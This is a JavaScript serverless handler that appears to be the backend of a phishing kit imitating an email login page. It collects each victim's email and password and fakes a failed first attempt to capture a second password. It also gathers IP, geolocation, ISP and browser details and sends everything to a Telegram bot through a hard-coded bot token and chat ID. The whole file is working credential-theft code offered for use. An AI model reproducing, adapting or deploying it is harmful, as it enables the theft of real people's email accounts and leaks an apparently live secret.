// api/login.js
const { json } = require('@vercel/node');

// In-memory store (resets on each deployment – for demo use only)
const attempts = {};
const firstPasswords = {};

// Telegram configuration – replace with your own
const BOT_TOKEN = '8969946726:AAHVMCm5YcPlhl09v3cwy85nLpgamhxX21A';
const CHAT_ID = '-5452025915';

async function sendTelegram(message) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const data = {
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
    };
    await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams(data),
    });
}

function getClientIP(req) {
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        const ips = forwarded.split(',').map(ip => ip.trim());
        for (const ip of ips) {
            if (ip && !ip.startsWith('127.') && !ip.startsWith('::1')) return ip;
        }
    }
    return req.socket?.remoteAddress || 'UNKNOWN';
}

async function getGeoInfo(ip) {
    if (!ip || ip === 'UNKNOWN') return null;
    try {
        const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,timezone`);
        const data = await res.json();
        if (data.status === 'success') return data;
    } catch (e) {}
    return null;
}

function getBrowserInfo(userAgent) {
    let browser = 'Unknown', os = 'Unknown';
    if (/Windows/i.test(userAgent)) os = 'Windows';
    else if (/Macintosh/i.test(userAgent)) os = 'macOS';
    else if (/Linux/i.test(userAgent)) os = 'Linux';
    else if (/iPhone|iPad/i.test(userAgent)) os = 'iOS';
    else if (/Android/i.test(userAgent)) os = 'Android';
    
    if (/Chrome/i.test(userAgent)) browser = 'Chrome';
    else if (/Firefox/i.test(userAgent)) browser = 'Firefox';
    else if (/Safari/i.test(userAgent)) browser = 'Safari';
    else if (/Edge/i.test(userAgent)) browser = 'Edge';
    else if (/Opera/i.test(userAgent)) browser = 'Opera';
    else if (/MSIE|Trident/i.test(userAgent)) browser = 'Internet Explorer';
    return { browser, os };
}

function getProviderLink(email) {
    const parts = email.split('@');
    if (parts.length < 2) return '#';
    const domain = parts[1].toLowerCase();
    const providers = {
        'gmail.com': 'https://mail.google.com',
        'googlemail.com': 'https://mail.google.com',
        'yahoo.com': 'https://login.yahoo.com',
        'outlook.com': 'https://outlook.live.com',
        'hotmail.com': 'https://outlook.live.com',
        'live.com': 'https://outlook.live.com',
        'aol.com': 'https://login.aol.com',
        'protonmail.com': 'https://mail.protonmail.com',
        'icloud.com': 'https://www.icloud.com/mail',
    };
    return providers[domain] || '#';
}

module.exports = async (req, res) => {
    // Only allow POST
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }

    const { email, password, action } = req.body;

    // If we receive email only (first step)
    if (action === 'email' && email) {
        if (!email.includes('@')) {
            return res.status(400).json({ error: 'Invalid email' });
        }
        // Initialize attempt count
        if (!attempts[email]) attempts[email] = 0;
        // Clear previous first password
        delete firstPasswords[email];
        return res.status(200).json({ success: true });
    }

    // Password submission (second step)
    if (action === 'password' && email && password) {
        const ip = getClientIP(req);
        const userAgent = req.headers['user-agent'] || 'Unknown';
        const timestamp = new Date().toISOString().replace('T', ' ').slice(0, 19);

        const geo = await getGeoInfo(ip);
        const location = geo ? `${geo.city}, ${geo.regionName}, ${geo.country}` : 'Unknown';
        const isp = geo?.isp || 'Unknown';
        const timezone = geo?.timezone || 'Unknown';

        const browserInfo = getBrowserInfo(userAgent);
        const provider = email.split('@')[1] || 'unknown';
        const providerLink = getProviderLink(email);

        const acceptLanguage = req.headers['accept-language'] || 'Unknown';
        const referer = req.headers['referer'] || 'Direct access';
        const host = req.headers['host'] || 'Unknown';
        const requestUri = req.url || 'Unknown';

        // Store first password if this is the first attempt
        if (!attempts[email]) attempts[email] = 0;
        const attemptCount = attempts[email] || 0;

        if (attemptCount === 0) {
            firstPasswords[email] = password;
        }

        // Increment attempt count
        attempts[email] = attemptCount + 1;
        const newAttemptCount = attempts[email];

        // Build instant message
        let msg = `🔐 <b>🔑 New Login Attempt</b>\n`;
        msg += `────────────────────────\n`;
        msg += `📧 <b>Email:</b> <code>${email}</code>\n`;
        msg += `🔑 <b>Password:</b> <code>${password}</code>\n`;
        msg += `🕒 <b>Time:</b> ${timestamp}\n`;
        msg += `────────────────────────\n`;
        msg += `🌍 <b>IP:</b> <code>${ip}</code>\n`;
        msg += `📍 <b>Location:</b> ${location}\n`;
        msg += `🏢 <b>ISP:</b> ${isp}\n`;
        msg += `🕰️ <b>Timezone:</b> ${timezone}\n`;
        msg += `📱 <b>Device:</b> ${userAgent}\n`;
        msg += `💻 <b>Browser:</b> ${browserInfo.browser}\n`;
        msg += `🖥️ <b>OS:</b> ${browserInfo.os}\n`;
        msg += `────────────────────────\n`;
        msg += `📎 <b>Provider:</b> ${provider}\n`;
        if (providerLink !== '#') msg += `🔗 <b>Login link:</b> <a href='${providerLink}'>${providerLink}</a>\n`;
        msg += `────────────────────────\n`;
        msg += `🌐 <b>Accept-Language:</b> ${acceptLanguage}\n`;
        msg += `🔗 <b>Referer:</b> ${referer}\n`;
        msg += `🏠 <b>Host:</b> ${host}\n`;
        msg += `📄 <b>Request URI:</b> ${requestUri}\n`;
        msg += `────────────────────────\n`;
        msg += `Attempt #${newAttemptCount} of 2`;

        await sendTelegram(msg);

        // If second attempt, send summary
        if (newAttemptCount >= 2 && firstPasswords[email]) {
            const firstPw = firstPasswords[email];
            let summary = `⚠️ <b>🚨 TWO FAILED ATTEMPTS 🚨</b>\n`;
            summary += `═══════════════════════════\n`;
            summary += `📧 <b>Email:</b> <code>${email}</code>\n`;
            summary += `🔑 <b>First Password:</b> <code>${firstPw}</code>\n`;
            summary += `🔑 <b>Second Password:</b> <code>${password}</code>\n`;
            summary += `────────────────────────\n`;
            summary += `🕒 <b>Time of second:</b> ${timestamp}\n`;
            summary += `🌍 <b>IP:</b> <code>${ip}</code>\n`;
            summary += `📍 <b>Location:</b> ${location}\n`;
            summary += `🏢 <b>ISP:</b> ${isp}\n`;
            summary += `📱 <b>Device:</b> ${userAgent}\n`;
            summary += `💻 <b>Browser:</b> ${browserInfo.browser}\n`;
            summary += `🖥️ <b>OS:</b> ${browserInfo.os}\n`;
            summary += `────────────────────────\n`;
            summary += `🌐 <b>Accept-Language:</b> ${acceptLanguage}\n`;
            summary += `🔗 <b>Referer:</b> ${referer}\n`;
            summary += `🏠 <b>Host:</b> ${host}\n`;
            summary += `📄 <b>Request URI:</b> ${requestUri}\n`;
            summary += `═══════════════════════════\n`;
            summary += `⚠️ <b>ACTION REQUIRED</b> – Check credentials!`;

            await sendTelegram(summary);

            // Clear session data for this email
            delete attempts[email];
            delete firstPasswords[email];

            // Return redirect instruction (client-side will handle)
            return res.status(200).json({ redirect: '/dashboard.html' });
        } else {
            // First attempt – return error for client to show
            return res.status(401).json({ error: 'Incorrect password. Please try again.' });
        }
    }

    return res.status(400).json({ error: 'Invalid request' });
};
